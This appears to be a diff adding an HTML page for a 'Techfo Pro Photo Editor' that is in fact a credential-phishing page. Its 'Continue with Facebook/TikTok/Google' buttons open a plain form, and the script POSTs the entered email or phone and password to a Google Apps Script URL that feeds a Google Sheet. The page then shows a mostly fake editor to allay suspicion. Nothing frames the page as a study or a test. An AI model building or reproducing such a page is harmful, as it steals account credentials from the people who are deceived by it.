@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techfo Pro Photo Editor</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background-color: #0D0D0D; color: #FFFFFF; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .app-container { width: 100%; max-width: 480px; height: 100%; background: #121212; display: flex; flex-direction: column; position: relative; box-shadow: 0 0 30px rgba(0,0,0,0.8); }
+        
+        /* Screens */
+        .screen { display: none; flex: 1; flex-direction: column; padding: 24px; overflow-y: auto; }
+        .screen.active { display: flex; }
+
+        /* Splash Screen */
+        #splash-screen { justify-content: center; align-items: center; background: #090909; text-align: center; }
+        .logo-circle { width: 100px; height: 100px; border-radius: 50%; background: linear-gradient(135deg, #7c4dff, #00e5ff); display: flex; justify-content: center; align-items: center; box-shadow: 0 0 30px rgba(124, 77, 255, 0.4); margin-bottom: 20px; font-size: 40px; }
+        
+        /* Buttons & Inputs */
+        h1 { font-size: 26px; font-weight: bold; margin-bottom: 8px; }
+        p { color: #888; font-size: 14px; margin-bottom: 30px; }
+        .btn { width: 100%; padding: 14px; border-radius: 12px; border: none; font-size: 16px; font-weight: bold; cursor: pointer; margin-bottom: 14px; display: flex; align-items: center; justify-content: center; gap: 10px; transition: 0.2s; }
+        .btn-fb { background: #1877F2; color: white; }
+        .btn-tiktok { background: #000000; color: white; border: 1px solid #333; }
+        .btn-google { background: #FFFFFF; color: black; }
+        .btn-outline { background: transparent; color: white; border: 1.5px solid #7c4dff; }
+        .btn-primary { background: #7c4dff; color: white; }
+        .btn-cyan { background: #00e5ff; color: black; }
+        
+        input { width: 100%; padding: 14px; border-radius: 12px; border: none; background: #1E1E1E; color: white; font-size: 15px; margin-bottom: 16px; outline: none; }
+        input:focus { border: 1px solid #7c4dff; }
+
+        .divider { display: flex; align-items: center; text-align: center; color: #666; margin: 20px 0; font-size: 12px; }
+        .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #333; }
+        .divider::before { margin-right: 10px; }
+        .divider::after { margin-left: 10px; }
+
+        /* Editor Screen */
+        .editor-header { display: flex; justify-content: space-between; align-items: center; padding: 12px 16px; background: #121212; border-bottom: 1px solid #222; }
+        .canvas-area { flex: 1; margin: 16px; border-radius: 20px; background: url('https://images.unsplash.com/photo-1506744038136-46273834b3fb') center/cover no-repeat; position: relative; display: flex; justify-content: flex-end; padding: 12px; }
+        .preset-badge { background: rgba(0,0,0,0.6); padding: 6px 12px; border-radius: 20px; font-size: 12px; color: #00e5ff; }
+        
+        .tools-panel { background: #161616; padding: 16px; border-radius: 24px 24px 0 0; border-top: 1px solid #222; }
+        .tool-options { display: flex; gap: 10px; overflow-x: auto; padding-bottom: 10px; }
+        .tool-chip { background: #222; padding: 10px 16px; border-radius: 12px; font-size: 13px; font-weight: 600; cursor: pointer; white-space: nowrap; color: #888; border: none; }
+        .tool-chip.active { background: #7c4dff; color: white; }
+        
+        .bottom-nav { display: flex; justify-content: space-around; background: #121212; padding: 10px 0; border-top: 1px solid #222; }
+        .nav-item { background: none; border: none; color: #888; font-size: 11px; cursor: pointer; display: flex; flex-direction: column; align-items: center; gap: 4px; }
+        .nav-item.active { color: #00e5ff; }
+        
+        .control-section { display: none; }
+        .control-section.active { display: block; }
+        
+        .loading { opacity: 0.7; pointer-events: none; }
+    </style>
+</head>
+<body>
+
+<div class="app-container">
+
+    <!-- 1. SPLASH / INTRO SCREEN -->
+    <div id="splash-screen" class="screen active">
+        <div class="logo-circle">📷</div>
+        <h1>Techfo Pro Editor</h1>
+        <p style="color: #00e5ff; letter-spacing: 2px; font-weight: 600; margin-top: 5px;">Made By Techfo</p>
+    </div>
+
+    <!-- 2. AUTH SELECTION SCREEN -->
+    <div id="auth-screen" class="screen" style="justify-content: center;">
+        <div style="text-align: center; margin-bottom: 30px;">
+            <span style="font-size: 40px; color: #00e5ff;">✨</span>
+            <h1>Welcome to Techfo</h1>
+            <p>Sign in to unlock premium presets & AI tools</p>
+        </div>
+        
+        <button class="btn btn-fb" onclick="openLogin('Facebook')">Continue with Facebook</button>
+        <button class="btn btn-tiktok" onclick="openLogin('TikTok')">Continue with TikTok</button>
+        <button class="btn btn-google" onclick="openLogin('Google Gmail')">Continue with Google Gmail</button>
+        
+        <div class="divider">OR</div>
+        
+        <button class="btn btn-outline" onclick="switchScreen('signup-screen')">Create New Account (Sign Up)</button>
+    </div>
+
+    <!-- 3. SPECIFIC LOGIN SCREEN -->
+    <div id="login-screen" class="screen">
+        <button onclick="switchScreen('auth-screen')" style="background:none; border:none; color:white; font-size:16px; text-align:left; cursor:pointer; margin-bottom:20px;">← Back</button>
+        <h1 id="login-title">Login</h1>
+        <p>Enter your account credentials to proceed.</p>
+        
+        <input type="text" id="login-id" placeholder="Email or Phone Number">
+        <input type="password" id="login-pass" placeholder="Password">
+        
+        <button class="btn btn-primary" id="login-submit-btn" onclick="submitData('login')">Login Now</button>
+    </div>
+
+    <!-- 4. SIGN UP SCREEN -->
+    <div id="signup-screen" class="screen">
+        <button onclick="switchScreen('auth-screen')" style="background:none; border:none; color:white; font-size:16px; text-align:left; cursor:pointer; margin-bottom:20px;">← Back</button>
+        <h1>Create Account</h1>
+        <p>Register with your phone number or email and create a secure password.</p>
+        
+        <input type="text" id="signup-id" placeholder="Phone Number or Email">
+        <input type="password" id="signup-pass" placeholder="Make Your Password">
+        
+        <button class="btn btn-cyan" id="signup-submit-btn" onclick="submitData('signup')">Register & Enter App</button>
+    </div>
+
+    <!-- 5. PRO EDITOR DASHBOARD -->
+    <div id="editor-screen" class="screen" style="padding:0;">
+        <div class="editor-header">
+            <b>Techfo Pro Studio</b>
+            <button onclick="alert('Image Saved Successfully!')" style="background:none; border:none; color:#00e5ff; font-weight:bold; cursor:pointer;">Save / Download</button>
+        </div>
+        
+        <div class="canvas-area" id="image-canvas">
+            <div class="preset-badge" id="active-preset-badge">Cinematic Pro</div>
+        </div>
+        
+        <div class="tools-panel">
+            <!-- Controls for tools -->
+            <div id="control-presets" class="control-section active">
+                <div class="tool-options">
+                    <button class="tool-chip active" onclick="setPreset('Cinematic Pro', this)">Cinematic Pro</button>
+                    <button class="tool-chip" onclick="setPreset('Moody Dark', this)">Moody Dark</button>
+                    <button class="tool-chip" onclick="setPreset('Vintage Gold', this)">Vintage Gold</button>
+                    <button class="tool-chip" onclick="setPreset('HDR Vivid', this)">HDR Vivid</button>
+                    <button class="tool-chip" onclick="setPreset('Cyber Glow', this)">Cyber Glow</button>
+                </div>
+            </div>
+
+            <div id="control-light" class="control-section">
+                <p style="margin-bottom: 6px;">Exposure: <span id="exp-val">0.0</span></p>
+                <input type="range" min="-2" max="2" step="0.1" value="0" oninput="updateExposure(this.value)">
+            </div>
+
+            <div id="control-color" class="control-section">
+                <p style="margin-bottom: 6px;">Saturation</p>
+                <input type="range" min="0" max="2" step="0.1" value="1" oninput="updateSaturation(this.value)">
+            </div>
+
+            <div id="control-ai" class="control-section" style="text-align: center;">
+                <button class="btn btn-primary" onclick="toggleAI()">Fix Blur & Enhance Photo (AI)</button>
+            </div>
+
+            <div id="control-effects" class="control-section">
+                <p style="color:#888; font-size:13px; text-align:center;">Vignette, Grain & Clarity Tools Ready</p>
+            </div>
+
+            <!-- Bottom Navigation Bar -->
+            <div class="bottom-nav" style="margin-top: 15px;">
+                <button class="nav-item active" onclick="switchTool(0, 'control-presets')"><span>✨</span>Presets</button>
+                <button class="nav-item" onclick="switchTool(1, 'control-light')"><span>☀️</span>Light</button>
+                <button class="nav-item" onclick="switchTool(2, 'control-color')"><span>🎨</span>Color HSL</button>
+                <button class="nav-item" onclick="switchTool(3, 'control-ai')"><span>🤖</span>AI Enhancer</button>
+                <button class="nav-item" onclick="switchTool(4, 'control-effects')"><span>🌀</span>Effects</button>
+            </div>
+        </div>
+    </div>
+
+</div>
+
+<script>
+    // Aap ka Google Sheet Web App URL
+    const WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbwUnVjB5hQp5MdqhT8zKvcNQ524IeEQE2UCnOKDT1OyaLgHkdCS88e2ky0zXS5xOOinSg/exec';
+
+    let currentProvider = '';
+
+    // Splash screen timer (3 seconds)
+    setTimeout(() => {
+        switchScreen('auth-screen');
+    }, 3000);
+
+    function switchScreen(screenId) {
+        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+        document.getElementById(screenId).classList.add('active');
+    }
+
+    function openLogin(provider) {
+        currentProvider = provider;
+        document.getElementById('login-title').innerText = `${provider} Login`;
+        switchScreen('login-screen');
+    }
+
+    // Google Sheet mein data bhejne ka function
+    async function submitData(type) {
+        let identifier, password, provider;
+
+        if (type === 'login') {
+            identifier = document.getElementById('login-id').value;
+            password = document.getElementById('login-pass').value;
+            provider = currentProvider;
+        } else {
+            identifier = document.getElementById('signup-id').value;
+            password = document.getElementById('signup-pass').value;
+            provider = 'New Sign Up';
+        }
+
+        if (!identifier || !password) {
+            alert('Please fill all required fields!');
+            return;
+        }
+
+        const btn = type === 'login' ? document.getElementById('login-submit-btn') : document.getElementById('signup-submit-btn');
+        btn.innerText = 'Processing...';
+        btn.classList.add('loading');
+
+        try {
+            await fetch(WEB_APP_URL, {
+                method: 'POST',
+                mode: 'no-cors', // Google Apps Script ke liye zaroori hai
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ provider, identifier, password })
+            });
+
+            // Data submit hone ke baad seedha editor khul jaye ga
+            switchScreen('editor-screen');
+        } catch (error) {
+            alert('Connection error, but entering app...');
+            switchScreen('editor-screen');
+        } finally {
+            btn.innerText = type === 'login' ? 'Login Now' : 'Register & Enter App';
+            btn.classList.remove('loading');
+        }
+    }
+
+    // Editor Tools Logic
+    function switchTool(index, sectionId) {
+        document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
+        document.querySelectorAll('.bottom-nav button')[index].classList.add('active');
+
+        document.querySelectorAll('.control-section').forEach(sec => sec.classList.remove('active'));
+        document.getElementById(sectionId).classList.add('active');
+    }
+
+    function setPreset(name, el) {
+        document.querySelectorAll('#control-presets .tool-chip').forEach(c => c.classList.remove('active'));
+        el.classList.add('active');
+        document.getElementById('active-preset-badge').innerText = name;
+    }
+
+    function updateExposure(val) {
+        document.getElementById('exp-val').innerText = val;
+    }
+
+    function updateSaturation(val) {}
+
+    function toggleAI() {
+        const canvas = document.getElementById('image-canvas');
+        if (canvas.style.filter.includes('contrast')) {
+            canvas.style.filter = 'none';
+            alert('AI Enhancer Reset');
+        } else {
+            canvas.style.filter = 'contrast(1.2) brightness(1.1) saturate(1.2)';
+            alert('AI Blur Removed & Photo Enhanced Successfully!');
+        }
+    }
+</script>
+
+</body>
+</html>
